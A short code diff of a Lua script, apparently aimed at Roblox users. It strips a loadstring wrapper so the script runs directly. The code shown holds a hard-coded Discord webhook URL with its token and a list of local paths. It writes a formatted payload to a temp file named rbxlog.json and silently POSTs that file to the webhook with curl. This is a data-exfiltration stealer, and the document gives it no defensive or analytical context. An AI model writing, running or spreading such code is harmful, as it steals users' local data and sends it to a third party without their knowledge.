@@ -1,4 +1,4 @@
-loadstring([[
+
 local WEBHOOK = "https://discord.com/api/webhooks/1574916444737503366/oVzDIU9pqdV20Azuik5b6nMWsL6A9yO7Id4f_wb_45jLZT9FEbISvvDhCUH1dKHjyKNR"
 
 local paths = {
@@ -57,4 +57,4 @@ local payload = string.format(
 local tmp = os.getenv("TEMP").."\\rbxlog.json"
 local f = io.open(tmp,"w") f:write(payload) f:close()
 os.execute('curl -s -H "Content-Type: application/json" -X POST -d @"'..tmp..'" "'..WEBHOOK..'"')
-]])
+
